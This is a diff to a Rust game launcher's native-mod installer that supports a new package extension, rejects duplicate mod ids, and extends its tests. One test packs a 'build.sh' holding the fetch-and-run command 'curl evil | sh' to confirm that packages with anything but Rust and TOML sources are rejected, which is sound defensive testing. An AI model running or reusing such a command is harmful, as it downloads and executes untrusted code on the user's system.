@@ -1,7 +1,7 @@
 //! Native mods (docs/native-mods.md): mixin bundles that
 //! levzzz5154's horizon-mixins (MIT, <https://github.com/horizon-rust/horizon-mixins>) applies to
 //! Horizon's source, which the launcher then compiles into a game of its own with its portable Rust
-//! ([`rust_toolchain`]). Unlike `.hmod` mods they are not sandboxed: their code runs with the
+//! ([`rust_toolchain`]). Unlike content-only mods they are not sandboxed: their code runs with the
 //! player's rights.
 //!
 //! A native mod pins the Horizon revision it was made for (a Nightly's or a release's commit).
@@ -496,12 +496,12 @@ pub fn cache_info(clear: bool) -> Result<CacheInfo, String> {
 const MANIFEST: &str = "horizon-mixin.toml";
 /// A registry download's manifest (`.hnmod`, `horizon_mods::index::native`), beside `mixins/<id>/`.
 const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
-/// Where an instance keeps the native mods installed from the registry, `<id>.hnmod`, each on or
+/// Where an instance keeps native mods, `<id>.hmod` or legacy `<id>.hnmod`, each on or
 /// off in `horizon-mods.txt` like any mod.
 pub const INSTALLED: &str = "horizon-native-mods";
 
 /// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
-/// Each `.hnmod` is checked again as the registry checks it (Rust and TOML under
+/// Each package is checked again as the registry checks it (Rust and TOML under
 /// `mixins/<id>/`, plus files under its `data/`, nothing run).
 pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     let out = root().join("installed.incoming");
@@ -509,14 +509,20 @@ pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
         .map(|dir| dir.flatten().map(|e| e.path()).collect())
         .unwrap_or_default();
-    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod"));
+    paths.retain(|p| horizon_mods::index::native::is_file(p));
     paths.sort();
-    let mut count = 0;
+    let mut ids = std::collections::HashSet::new();
     for path in paths {
         let bundle = horizon_mods::index::native::Bundle::read(&path)
             .map_err(|e| format!("{}: {e}", path.display()))?;
         if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
             continue;
+        }
+        if !ids.insert(bundle.manifest.id.clone()) {
+            return Err(trf(
+                "Duplicate native mod id {id}.",
+                &[("id", &bundle.manifest.id)],
+            ));
         }
         let dir = out.join(&bundle.manifest.id);
         for (name, bytes) in &bundle.files {
@@ -524,9 +530,8 @@ pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
             fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
             fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
         }
-        count += 1;
     }
-    if count == 0 {
+    if ids.is_empty() {
         return Err(format!(
             "No native mod is turned on in {}: install one from the Mods page first.",
             home.join(INSTALLED).display()
@@ -2989,7 +2994,27 @@ mod tests {
             )
             .unwrap()
         );
-        pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
+        fs::remove_file(home.join(INSTALLED).join("veinminer.hnmod")).unwrap();
+        pack("veinminer.hmod", Some(("horizon-mod.toml", "id = \"veinminer\"\nname = \"Veinminer\"\nversion = \"0.3.0\"\napi = \"0.2\"\ncapabilities = [\"registries\"]\n")));
+        let out = installed_mods(&home).unwrap();
+        assert_eq!(bundles(&out).unwrap()[0].id, "veinminer");
+        assert!(
+            !out.join("veinminer/horizon-mod.toml").exists(),
+            "content is not compiled"
+        );
+        assert_eq!(crate::native_status::enabled(&home)[0].0, "veinminer");
+        pack("duplicate.hnmod", None);
+        assert!(installed_mods(&home)
+            .unwrap_err()
+            .contains("Duplicate native mod id"));
+        fs::remove_file(home.join(INSTALLED).join("duplicate.hnmod")).unwrap();
+        crate::browser::java::set_enabled(&home, "veinminer", false).unwrap();
+        assert!(
+            installed_mods(&home).is_err(),
+            "a combined native mod can be turned off"
+        );
+        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
+        pack("veinminer.hmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
     }
 
